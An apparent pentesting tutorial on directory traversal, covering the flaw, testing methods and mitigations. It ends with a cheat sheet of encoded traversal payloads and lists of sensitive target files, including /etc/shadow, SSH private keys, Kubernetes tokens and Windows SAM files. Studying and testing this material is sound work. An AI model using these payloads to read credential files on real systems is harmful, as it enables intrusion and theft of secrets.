# Directory Transversal

# Introduction:
Directory traversal, also known as path traversal, is a web application vulnerability that allows an attacker to access files or directories outside the intended scope of the application. Ethical hackers and penetration testers often encounter directory traversal vulnerabilities during security assessments. In this article, we will delve into the intricacies of directory traversal, discuss its implications, and explore effective techniques for testing and securing web applications.

## Understanding Directory Traversal:
Directory traversal occurs when a web application fails to properly sanitize user-supplied input used to construct file paths. Attackers exploit this vulnerability by providing malicious input that traverses beyond the intended directory structure, potentially accessing sensitive files or directories on the server. The vulnerability typically arises from improper validation or inadequate input sanitization mechanisms.

## Implications of Directory Traversal:
Successful exploitation of directory traversal vulnerabilities can have severe consequences, including unauthorized access to sensitive information, exposure of critical system files, remote code execution, or even full compromise of the target system. Attackers can leverage directory traversal to retrieve password files, configuration files, source code, or execute arbitrary commands on the server.

### Techniques for Testing Directory Traversal Vulnerabilities:
a. Manual Testing: Start by identifying user inputs that interact with file operations, such as file downloads, file inclusion, or file uploads. Gradually manipulate these inputs to traverse directories. Use techniques like "../" or URL-encoded representations ("%2e%2e/") to bypass input sanitization. Observe the application's responses to identify successful traversal attempts and potential vulnerabilities.

b. Automated Scanning: Utilize web vulnerability scanning tools like Burp Suite, OWASP ZAP, or Nikto to automate the process of detecting directory traversal vulnerabilities. These tools can help identify common traversal patterns and provide a starting point for manual testing.

c. File Inclusion Attacks: Directory traversal often intersects with file inclusion vulnerabilities. Exploit the traversal to include arbitrary files on the server and examine if the application allows unauthorized access to sensitive resources.

d. Null Byte Injection: Some applications sanitize user inputs by removing or replacing certain characters. Exploit this behavior by injecting a null byte ("%00") to terminate the input string and bypass sanitization checks.

e. Operating System Specifics: Consider the target operating system's file system conventions. Windows-based systems use backslashes ("") as directory separators, while Unix-like systems use forward slashes ("/"). Tailor your traversal techniques accordingly.

### Mitigation and Prevention:
a. Input Validation and Sanitization: Implement strict input validation mechanisms to ensure that user-supplied input does not contain any malicious characters or sequences. Whitelist-based validation can be more effective than blacklisting specific characters or sequences.
b. Implement Proper Access Controls: Restrict file system access based on user privileges. Employ authorization mechanisms to ensure that users can only access files or directories that they are explicitly authorized to access.

c. Use Safe APIs and Libraries: Whenever possible, leverage secure file-handling APIs and libraries provided by the programming language or framework being used. These libraries often handle file operations securely and protect against directory traversal attacks.

d. Apply Principle of Least Privilege: Configure file system permissions to grant the minimum required access rights to web application processes. Avoid granting unnecessary read or write permissions to sensitive directories.

e. Regular Patching and Updates: Keep all software components, including web servers, frameworks, and dependencies, up to date with the latest security patches. Frequently monitor vendor releases and security advisories to address known vulnerabilities promptly.

# Conclusion:
Directory traversal vulnerabilities pose a significant threat to the security of web applications. By understanding the fundamentals of directory traversal, ethical hackers and penetration testers can effectively identify and exploit these vulnerabilities, helping organizations secure their systems. Employing a combination of manual testing techniques, automated scanning tools, and implementing robust security measures can mitigate the risks associated with directory traversal and safeguard sensitive data from unauthorized access or compromise.

### Tutorials on Directory Transversal
- [What is directory transversal](https://learn.snyk.io/lesson/directory-traversal/) - A good article by Synk introducing the subject
- [What is directory transversal and how to prevent it](https://portswigger.net/web-security/file-path-traversal) - A good article on directory transversal and how to mitigate it
- [Directory Transversal (Path transversal)](https://www.invicti.com/learn/directory-traversal-path-traversal/) - A good article by AppSec
- [Directory Transversal Tutorial](https://community.veracode.com/s/videotutorial/directory-traversal-tutorial-MCMEQRWCYPAFAHBAKRE7HHSQFAAY)- a good overview by Veracode

### Payloads for Directory Transversal
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216

```

16 bits Unicode

```
. = %u002e
/ = %u2215
\ = %u2216

```
UTF-8 Unicode encoding
```
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c

```

Double URL Encoding
```
. = %252e
/ = %252f
\ = %255c

```

Interesting Linux Files
```
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db

```

Interesting Windows Files
```
c:\windows\system32\license.rtf
c:\windows\system32\eula.txt

```
Other Windows Files to check
```
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system

```
Check the following log files
```
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail

```